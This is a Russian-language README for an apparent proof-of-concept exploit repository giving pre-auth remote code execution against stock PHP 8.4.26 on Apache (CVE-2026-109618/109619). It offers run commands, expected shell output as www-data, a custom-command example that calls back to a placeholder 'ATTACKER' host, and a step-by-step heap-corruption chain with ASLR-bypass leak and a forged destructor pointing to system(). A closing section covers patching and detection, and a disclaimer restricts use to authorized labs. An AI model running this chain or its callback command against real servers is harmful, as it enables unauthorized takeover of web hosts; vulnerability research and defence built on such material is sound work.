# php2shell-poc — pre-auth RCE на стоковом PHP 8.4.26 (Apache), одним файлом

CVE-2026-109618 / CVE-2026-109619 («php2shell») — однофайловый pure-HTTP
эксплойт, превращающий OOM-bailout в `session.upload_progress` в удалённое
выполнение кода против **официального Docker-образа `php:8.4.26-apache`
с нетронутым `php.ini-production`**:

- `display_errors=Off`, `memory_limit=128M`, `post_max_size=8M`
- без кода приложения, без `session_start()`, без файлов на цели, без gdb
- pre-auth, ASLR обходится утечкой по тому же каналу, ~2 с на попытку

> **Только авторизованные исследования.** Репозиторий — для воспроизведения
> уязвимости в собственной лаборатории. Не направлять на системы, на тестирование
> которых нет явного разрешения. Пропатченные версии: PHP 8.2.35, 8.3.36,
> 8.4.27, 8.5.12 (коммит `3584a98bda`).

## Быстрый старт

```bash
# 1. поднять уязвимую лабу (prefork с одним worker, стоковый php.ini-production)
cd lab
docker compose up -d
cd ..

# 2. прожечь цепочку (restart = свежий ASLR на каждый прогон)
python3 exploit/php2shell_poc.py --port 18110 --restart p2s-pure-18110
```

Ожидаемый вывод:

```
[try 1] A1: END-cleanup send_cookie OOM
[try 1] B1: stale-id OOB read (chunk base + libphp)
      decoded=819208 zval_ptr_dtor=0x7707c3eefb60 -> libphp=0x7707c3891000
      ...
[4/4] RCE OK:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Своя команда (до ~200 байт):

```bash
python3 exploit/php2shell_poc.py --port 18110 --restart p2s-pure-18110 \
    --cmd 'php -r "file_get_contents(\"http://ATTACKER/ok\");"'
```

Proof команды по умолчанию (`id>/out/p1`) забирается автоматически
(локальный `lab/out/p1` или `docker exec ... cat /out/p1`).

## Цепочка

| Шаг | Запрос | Эффект |
|-----|--------|--------|
| A1 | chunked multipart, 860 вложенных файловых полей глубины 64 + 78×8000 Б + 5 query-параметров | OOM внутри `php_url_encode` в END-cleanup rfc1867 оставляет `PS(id)`, `PS(send_cookie)`, `PS(mod_data)` висячими в worker |
| B1 | 16 forge-значений на весь chunk + 900 массивов, chunked | поддельный заголовок `zend_string` реактивирует stale id-chunk; `Set-Cookie` несёт 800 КБ out-of-bounds чтения → **база libphp** (1095 вхождений `zval_ptr_dtor`) и **база main chunk** (2МиБ-бакет ровно с 87 указателями) |
| A2 | обычный multipart, 880 вложенных полей + 115 филлеров | дешёвый OOM оставляет `PS(hash_serialize_verifier)` висячим на `main+0x7D720` |
| B2 | обычный multipart, 995×384 Б спрей + поле `ht` | верификатор перезаписывается ссылкой на поддельный `zend_array` с `pDestructor = zif_system`; на shutdown вызывается `system(cmd)` |

Два примитива, делающие цепочку рабочей на дефолт-конфиге:

- **`Transfer-Encoding: chunked` обходит `post_max_size`**: без
  `Content-Length` поле `content_length=0`, rfc1867 пропускает проверку
  размера — multipart любого размера шейпит кучу при стоковых 128M/8M.
- **Утечка вместо угадывания**: обе базы ASLR берутся из того же 800 КБ
  окна с проверкой правдоподобия `libphp − main` (0x1A00000–0x1F00000);
  плохие утечки отбрасываются, цепочка перезапускается.

## Отличия от базового эксплойта

Это упаковка публичной цепочки из
[9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
(коммит `aeb5dcc`, 2026-10-22) с двумя изменениями:

1. **Всё в одном файле на stdlib** (`exploit/php2shell_poc.py`) — билдеры
   тел, chunked/plain-отправка, декодер утечки и оркестрация.
2. **Широкий фильтр указателей в декодере** (`0x500000000000–0x800000000000`
   вместо `0x7f…`): на ядрах, где `mmap_base` кладёт кучу ниже `0x7f`
   (например WSL2: `0x71..`/`0x7c..`), оригинальный фильтр видит ноль
   указателей. Это единственное функциональное изменение.

## Границы применимости

- Константы (`zval_ptr_dtor`, `zif_system`, `S`, формы запросов) привязаны
  к **официальному образу `php:8.4.26-apache`** (Debian trixie, x86-64,
  NTS, prefork). Другие версии/сборки — выводить офсеты заново и
  перекалибровывать счётчики полей.
- Только Apache mod_php. Вариант бага на php-fpm (Chain E из
  исследования) — другая цепочка.
- OOM-примитив требует конечного `memory_limit`; `memory_limit=-1` ломает
  предсказуемый отказ аллокации, на котором всё строится.
- A и B должны попасть на один worker: лаба пинит одного prefork-ребёнка.
  На мульти-worker деплое нужны ретраи/спрей.
- На пропатченных версиях (8.2.35/8.3.36/8.4.27/8.5.12+) не работает,
  офсеты подходят только 8.4.26.

## Митигейшн / детект (защитная сторона)

- **Обновить PHP** — единственное полное исправление (`3584a98bda`).
- `session.upload_progress.enabled=Off` **не** чинит CVE-2026-109618
  (OOM-путь не требует upload_progress).
- Блокировка `PHP_SESSION_UPLOAD_PROGRESS` в multipart на границе рвёт все
  запросы этой цепочки (легитимного применения почти нет).
- Готовые правила Suricata/Sigma/ModSecurity/OpenResty и анализ дыр патча:
  [ikow/php2shell-poc](https://github.com/ikow/php2shell-poc); разборы
  [JFrog](https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/)
  и [Wiz](https://www.wiz.io/blog/php2shell-php-rce).

## Авторство

- **9bie** — полная pure-HTTP цепочка на стоковом `php.ini-production`
  (`php2shell-bypass-aslr-exp`), которую этот PoC упаковывает.
- **Qi Deng (@ikow)** — исследование php2shell, анализ пяти цепочек и
  детект-комплект.
- Разработчики PHP — фикс и обсуждение advisory.

## Лицензия

MIT — см. [LICENSE](LICENSE). Логика эксплойта принадлежит его авторам;
этот репозиторий добавляет упаковку и фикс декодера под WSL2.
